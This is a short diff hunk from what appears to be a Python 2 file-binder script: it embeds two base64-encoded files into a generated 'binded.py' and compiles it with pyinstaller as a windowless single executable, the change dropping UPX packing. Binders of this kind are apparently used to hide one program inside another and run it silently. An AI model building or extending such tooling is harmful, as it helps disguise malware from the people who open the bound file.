@@ -39,6 +39,6 @@ if path.exists(file2)==False:
 sys.exit()""")
 '''%(file1_B64_encode,file2_B64_encode,file1,file2))
 import os
-os.system('pyinstaller --clean --upx-dir "upx395w" --noconsole --windowed --onefile binded.py"')
+os.system('pyinstaller --clean --noconsole --windowed --onefile binded.py"')
 print "say fuck 2 world guys :)"
 
